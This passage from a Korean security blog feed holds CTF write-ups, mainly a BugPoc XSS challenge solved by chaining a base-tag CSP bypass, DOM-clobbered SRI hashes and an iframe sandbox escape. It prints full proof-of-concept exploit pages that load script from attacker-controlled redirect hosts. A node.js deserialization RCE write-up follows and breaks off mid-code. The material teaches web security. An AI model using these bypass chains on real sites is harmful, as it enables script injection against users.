<span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> win = <span class="built_in">window</span>.open(<span class="string">&#x27;http://calc.buggywebsite.com/frame.html&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> exploit = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">            setTimeout(function()&#123; win.postMessage([&quot;<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">\</span>&quot;&lt;<span class="attr">script</span> <span class="attr">src</span>=<span class="string">/angular.min.js</span>&gt;</span>&lt;\/script&gt;<span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">x</span> = &#123;<span class="string">&#x27;y&#x27;</span>:<span class="string">&#x27;&#x27;</span>.constructor.prototype&#125;; x[&#x27;y&#x27;].charAt=[].join;$eval(<span class="name">&#x27;x=alert(document.domain)&#x27;</span>);&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span>\&quot;&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>&quot;],&#x27;*&#x27;) &#125;, 3000);</span></span></span><br><span class="line">        &#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>BugPoc XSS Challenge<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>If you click the button below and execute poc code, You can trigger the xss.<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">exploit()</span> <span class="attr">value</span>=<span class="string">&quot;Trigger&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://munhwasudo.tistory.com/entry/2-ngapp-nginit-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0-AngularJS%EA%B0%9C%EB%85%90-%EA%B0%84%EB%8B%A8%ED%95%9C-todo%EA%B0%9D%EC%B2%B4-%EB%A7%8C%EB%93%A4%EC%96%B4%EB%B3%B4%EA%B8%B0">https://munhwasudo.tistory.com</a><br><br><a href="https://developer.mozilla.org/ko/docs/Web/API/Window/postMessage">https://developer.mozilla.org/ko/docs/Web/API/Window/postMessage</a><br><br><a href="https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20170727_AngularJS.pdf">https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20170727_AngularJS.pdf</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wacky Text Generator Write Up</title>
      <link href="2021/06/10/2021-06-10-Wacky-Text-Generator/"/>
      <url>2021/06/10/2021-06-10-Wacky-Text-Generator/</url>
      
        <content type="html"><![CDATA[<h2 id="Descriptions"><a href="#Descriptions" class="headerlink" title="Descriptions"></a>Descriptions</h2><p><a href="https://bugpoc.com/">BugPoc</a>에서 만든 XSS Challenge이고, 문제의 목적은 CSP/SRI 및 Sandbox를 우회하고, XSS를 트리거 하는 것이다.</p><hr><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/1.png?raw=true"></p><p>위 사진을 보면 Wacky Text를 입력해주면 해당 값이 Dom 내부에 삽입되는 것을 볼 수 있다.</p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/2.png?raw=true"></p><p>콘솔창을 확인해 보니 <code>iframe</code>을 이용해서 <code>/frame.html</code>의 돔을 끌어와서 사용하는 것을 볼 수 있다. </p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/3.png?raw=true"></p><p>그래서 <code>/frame.html</code>로 접근을 해보니 아니나 다를까 Error 페이지가 발생하는 것 이었다.</p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/4.png?raw=true"></p><p>코드를 확인해 보니 190 line에서 window.name의 값이 “iframe”인 지 아닌 지를 검증하고 있고, window.name의 값이 “iframe”이 아니라면 else 문에 의해서 Error 페이지가 출력이 되는 것 이다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS Poc : CSP/SRI/Sandbox Bypass<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> exploit = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">const</span> payload = <span class="string">&#x27;pocas&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">const</span> url = <span class="string">`https://wacky.buggywebsite.com/frame.html?param=<span class="subst">$&#123;payload&#125;</span>`</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">                <span class="built_in">window</span>.name = <span class="string">&#x27;iframe&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">window</span>.location = url;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">       <span class="tag">&lt;<span class="name">h3</span>&gt;</span>If you click the button below.<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;button&#x27;</span> <span class="attr">onclick</span>= <span class="string">&#x27;exploit()&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;Trigger&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>그래서 위와 같이 window.name의 값으로 “iframe”을 주고, window.location 메서드를 이용해서 라디아렉트를 시켜주니 window.name 검증은 쉽게 해결 할 수 있었다.</p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/5.png?raw=true"></p><p>그리고 나서 <code>&lt;svg/onload=alert(1)&gt;</code>을 이용해서 XSS 트리거를 시도 했지만 입력값이 split으로 쪼개져서 위와 같이 들어가게 된다.</p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/6.png?raw=true"></p><p>하지만 입력값이 바디 부분에만 들어가는 것이 아닌 헤드에 있는 타이틀의 값으로도 들어가기 때문에 타이틀 태그를 닫고 xss 트리거 시도를 하면 될 거 같다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Refused to execute inline event handler because it violates the following Content Security Policy directive: &quot;script-src &#39;nonce-jogzjbybjuiy&#39; &#39;strict-dynamic&#39;&quot;. Either the &#39;unsafe-inline&#39; keyword, a hash (&#39;sha256-...&#39;), or a nonce (&#39;nonce-...&#39;) is required to enable inline execution. Note that hashes do not apply to event handlers, style attributes and javascript: navigations unless the &#39;unsafe-hashes&#39; keyword is present.</span><br></pre></td></tr></table></figure><p>그래서 <code>&lt;/title&gt;&lt;svg/onload=alert(1)&gt;</code>를 전달해주니 Dom Parsing에 의해서 Dom으로 잘 들어가는 것을 확인 할 수 있었는데 위와 같이 CSP 에러가 나는 것을 확인 할 수 있었다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content-security-policy: script-src &#39;nonce-jogzjbybjuiy&#39; &#39;strict-dynamic&#39;; frame-src &#39;self&#39;; object-src &#39;none&#39;;</span><br></pre></td></tr></table></figure><p>Response를 확인해보면 위와 같이 CSP가 설정되어 있는 것을 볼 수 있다. 그래서 <code>CSP Evaluator</code>를 이용해서 해당 CSP 위험도를 확인해보니 base-uri가 누락되면 스크립트를 삽입할 수 있다고 한다.</p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/7.png?raw=true"></p><p>그래서 개인서버에 xss payload를 올리고 위와 같이 <base> 태그를 이용해서 익스를 시도하니 CSP는 우회가 되었지만 SRI에 걸리는 것을 볼 수 있다. SRI는 SubResource Integrity의 줄임말로 무결성을 체크하는 보안 설정 중 하나이다. 이는 웹 서버의 코드가 위/변조가 발생하면 해당 스크립트의 실행을 중지하게 된다. 또한 무결성을 확인을 할 때는 고유의 Hash 값을 이용해서 검증을 한다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// securely load the frame analytics code</span></span><br><span class="line"><span class="keyword">if</span> (fileIntegrity.value) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// create a sandboxed iframe</span></span><br><span class="line">analyticsFrame = <span class="built_in">document</span>.createElement(<span class="string">&#x27;iframe&#x27;</span>);</span><br><span class="line">analyticsFrame.setAttribute(<span class="string">&#x27;sandbox&#x27;</span>, <span class="string">&#x27;allow-scripts allow-same-origin&#x27;</span>);</span><br><span class="line">analyticsFrame.setAttribute(<span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;invisible&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(analyticsFrame);</span><br><span class="line"></span><br><span class="line"><span class="comment">// securely add the analytics code into iframe</span></span><br><span class="line">script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.setAttribute(<span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;files/analytics/js/frame-analytics.js&#x27;</span>);</span><br><span class="line">script.setAttribute(<span class="string">&#x27;integrity&#x27;</span>, <span class="string">&#x27;sha256-&#x27;</span>+fileIntegrity.value);</span><br><span class="line">script.setAttribute(<span class="string">&#x27;crossorigin&#x27;</span>, <span class="string">&#x27;anonymous&#x27;</span>);</span><br><span class="line">analyticsFrame.contentDocument.body.appendChild(script);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위 코드를 확인해 보면 fileIntegrity 객체의 있는 value 값을 이용해서 hash 값을 가져오고, 해당 hash 값과 고유의 hash 값을 비교하게 된다. 다시 SRI 에러를 확인해보면 <code>https://nq5h16dpmbg2.redir.bugpoc.ninja/files/analytics/js/frame-analytics.js</code>의 대한 Integrity의 digest 값을 찾지 못 해서 <code>&lt;your hash value&gt;</code> 값을 블록했다고 한다.</p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/9.png?raw=true"></p><p><code>/files/analytics/js/frame-analytics.js</code>의 값을 확인 해보면 위와 같다.</p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/8.png?raw=true"></p><p>그리고 base 태그를 이용해서 스크립트를 삽입 한 후에는 <code>frame-analytics.js</code>의 값이 alert(1)로 변조가 된 것을 볼 수 있다. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl dgst -sha384 -binary FILENAME.js | openssl base64 -A</span><br></pre></td></tr></table></figure><p>그럼 <code>frame-.js</code>의 파일 값이 변조가 되었다고 왜 SRI에 걸리냐고 궁금해 할 수도 있다. 이는 Hash를 생성하는 방법을 보면 알다시피 특정 파일 값을 기준으로 hash 값을 생성한다. 즉, 문제에서는 alert(1)로 변조 되기 전에 파일 값으로 hash 값을 생성해서 사용하고 있는데, 우리가 해당 파일의 값을 alert(1)로 변조하였기 때문에 hash 값 자체가 달라지므로 SRI에 걸리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fileIntegrity.value</span><br></pre></td></tr></table></figure><p>하지만 js 단에서 Integrity 값을 가져 올 때, 위와 같이 값을 가져오게 된다. 하지만 우리는 해당 값으로 고유의 hash 값을 넣어줘야 하는데 이는 <code>Dom Clobbering</code> 기법을 이용해서 처리할 수 있다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">output</span> <span class="attr">id</span>=<span class="string">&quot;fileIntegrity&quot;</span>&gt;</span>Hello Pocas<span class="tag">&lt;/<span class="name">output</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    alert(fileIntegrity.value);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/10.png?raw=truee"></p><p>위와 같이 코드를 올리고 실행하면 <code>fileIntegrity.value</code>의 값으로 <code>Hello Pocas</code>가 들어가는 것을 볼 수 있다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">output</span> <span class="attr">id</span>=<span class="string">&quot;fileIntegrity&quot;</span>&gt;</span>Hello Pocas<span class="tag">&lt;/<span class="name">output</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/11.png?raw=true"></p><p>그래서 위 페이로드를 작성해서 전달해주고, 콘솔 창에서 fileIntegrity.value를 입력해보면 우리가 입력한 고유의 값이 박힌 것을 볼 수 있다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">BASE</span> <span class="attr">HREF</span>=<span class="string">&quot;https://nq5h16dpmbg2.redir.bugpoc.ninja&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">output</span> <span class="attr">id</span>=<span class="string">&quot;fileIntegrity&quot;</span>&gt;</span>bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF%2bpI=<span class="tag">&lt;/<span class="name">output</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/12.png?raw=true"></p><p>그래서 <code>Dom Clobbering</code> 기법을 이용해서 fileIntegrity의 값을 변조해주니 SRI도 잘 우회한 것을 볼 수 있다. 하지만 위와 같이 <code>Sandbox</code> 설정에 의해서 alert() 함수가 실행이 되지 않는 것을 볼 수 있다. 하지만 이 <code>Sandbox</code>는 현재 Iframe에만 적용이 되어 있기 때문에 <code>top</code>, <code>parent</code> 돔의 참조해서 alert()를 끌어와 사용하면 쉽게 우회할 수 있다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">BASE</span> <span class="attr">HREF</span>=<span class="string">&quot;https://p93yp8ell2os.redir.bugpoc.ninja&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">output</span> <span class="attr">id</span>=<span class="string">&quot;fileIntegrity&quot;</span>&gt;</span>pUo1a+NaJwmvkDH8uSo6a1Z+emeQfamsHK2k52tjpTE=<span class="tag">&lt;/<span class="name">output</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Wacky%20Text%20Generator/images/13.png?raw=true"></p><p>그래서 마지막으로 위와 같이 페이로드를 작성해주고 보내주면 XSS가 잘 트리거 되는 것을 볼 수 있다. 또한 위 페이로드가 전 페이로드와 Hash 값이 다른 이유는 위에 이야기 했다 시피 고유의 해쉬 값은 파일의 컨텐츠 값에 따라서 달라지기 때문이다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">frame-analytics.js의 값이 alert(1) 일 때의 해쉬 값 &#x3D;&gt; bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI&#x3D;</span><br><span class="line">frame-analytics.js의 값이 window.top.alert(1) 일 때의 해쉬 값 &#x3D;&gt; pUo1a+NaJwmvkDH8uSo6a1Z+emeQfamsHK2k52tjpTE&#x3D;</span><br><span class="line">frame-analytics.js의 값이 window.parent.alert(1) 일 때의 해쉬 값 &#x3D;&gt; Vxz2g08RDzmBMHlaYk0sNqiCWbU6UKBSCH+xw2Qa1dM&#x3D;</span><br></pre></td></tr></table></figure><p>위와 같이 다 다르다 ㅇㅇ</p><hr><h2 id="Poc-Sollution"><a href="#Poc-Sollution" class="headerlink" title="Poc (Sollution)"></a>Poc (Sollution)</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS Poc : CSP/SRI/Sandbox Bypass<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// content-security-policy: script-src &#x27;nonce-gyzyfhmynqlj&#x27; &#x27;strict-dynamic&#x27;; frame-src &#x27;self&#x27;; object-src &#x27;none&#x27;;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// TR;DL : XSS =&gt; CSP Bypass and SRI Bypass using the Dom Clobbering. And finally trigger a xss using the window.top.alert(1).</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// First, I bypassed csp using the base tag.</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// Second, I bypassed integrity value used in SRI(SubResource Integrity) using the Dom Clobbering.</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// Why using the window.top? We should call the alert() method on the wintow.top and window.parent because Using the `sandbox allow-scripts allow-same-origin` in Child iframe. This is sandbox bypass.</span></span></span><br><span class="line">                       </span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> Dom_Clobbering = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                const payload = &#x27;<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">output</span> <span class="attr">id</span>=<span class="string">&quot;fileIntegrity&quot;</span>&gt;</span>Modified<span class="tag">&lt;/<span class="name">output</span>&gt;</span>&#x27;;</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">const</span> url = <span class="string">`https://wacky.buggywebsite.com/frame.html?param=<span class="subst">$&#123;payload&#125;</span>`</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">                <span class="built_in">window</span>.name = <span class="string">&#x27;iframe&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">window</span>.location = url;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> exploit = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                const payload = &#x27;<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">BASE</span> <span class="attr">HREF</span>=<span class="string">&quot;https://mfol4633a69b.redir.bugpoc.ninja&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">output</span> <span class="attr">id</span>=<span class="string">&quot;fileIntegrity&quot;</span>&gt;</span>F0NfquGiAKFW0hvQsOmMsnAyVCjs3sjH0IyIf8wogAU=<span class="tag">&lt;/<span class="name">output</span>&gt;</span>&#x27;;</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">const</span> url = <span class="string">`https://wacky.buggywebsite.com/frame.html?param=<span class="subst">$&#123;payload&#125;</span>`</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">                <span class="built_in">window</span>.name = <span class="string">&#x27;iframe&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">window</span>.location = url;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>BugPoc XSS Challenge<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>If you click the button below and Enter the `console.log(fileIntegrity.value);` on the chrome console window, You can see that the hash value has been modified to &#x27;Modified&#x27;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;button&#x27;</span> <span class="attr">onclick</span>= <span class="string">&#x27;Dom_Clobbering()&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;Test&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>If you click the button below and execute poc code, You can trigger the xss.<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;button&#x27;</span> <span class="attr">onclick</span>= <span class="string">&#x27;exploit()&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;Trigger&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity</a><br><br><a href="https://portswigger.net/research/dom-clobbering-strikes-back">https://portswigger.net/research/dom-clobbering-strikes-back</a><br><br><a href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com/</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zh3r0 CTF V2 Write Up</title>
      <link href="2021/06/06/2021-06-05-Zh3r0-2021-CTF/"/>
      <url>2021/06/06/2021-06-05-Zh3r0-2021-CTF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-06-06%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%207.29.44.png?raw=true"></p><p>This weekend, <a href="http://reteps.github.io/">Peter</a> and I participated in the Zh3r0 CTF V2 as <code>icypete</code> team. I only solved the many web challenge and He solved the web and misc. I had fun and finally got 31st place.</p><hr><h2 id="Web-sparta-100-pts"><a href="#Web-sparta-100-pts" class="headerlink" title="(Web) sparta [100 pts]"></a>(Web) sparta [100 pts]</h2><blockquote><p>The sparta challenge is using the simple deserialization RCE vulnerability in node.js</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">escape</span> = <span class="built_in">require</span>(<span class="string">&#x27;escape-html&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">&#x27;node-serialize&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">app.use(cookieParser());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">res.render(<span class="string">&#x27;home.ejs&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">res.render(<span class="string">&#x27;loggedin.ejs&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/guest&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">   res.render(<span 